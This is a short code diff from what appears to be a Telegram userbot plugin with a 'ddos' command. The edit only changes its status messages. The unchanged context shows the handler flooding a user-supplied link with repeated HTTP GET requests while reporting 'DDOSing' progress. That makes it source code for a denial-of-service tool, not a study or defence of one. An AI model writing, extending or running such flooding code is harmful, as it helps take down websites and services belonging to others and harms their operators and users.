@@ -43,7 +43,10 @@ async def ddos_cmd(_, message: Message):
         except IndexError:
             link = message.command[1]
 
-    await message.edit(f"<b>🌴 DDOSing {message.command[1]} 🌴</b>")
+    await message.edit(
+        f"<b>🌴 DDOSing {message.command[1]} 🌴</b>\n" f"{rave}",
+        disable_web_page_preview=True,
+    )
 
     funcs = (session.get(link) for _ in range(loops))
     for c in range(amount):
@@ -51,7 +54,9 @@ async def ddos_cmd(_, message: Message):
         percent = round(c / amount * 100)
         if edit:
             await message.edit(
-                f"<b>🌴 DDOSing {message.command[1]} 🌴 (<code>{percent}%</code>)</b>"
+                f"<b>🌴 DDOSing {message.command[1]} 🌴 (<code>{percent}%</code>)</b>\n"
+                f"{rave}",
+                disable_web_page_preview=True,
             )
         await sleep(delay)
 
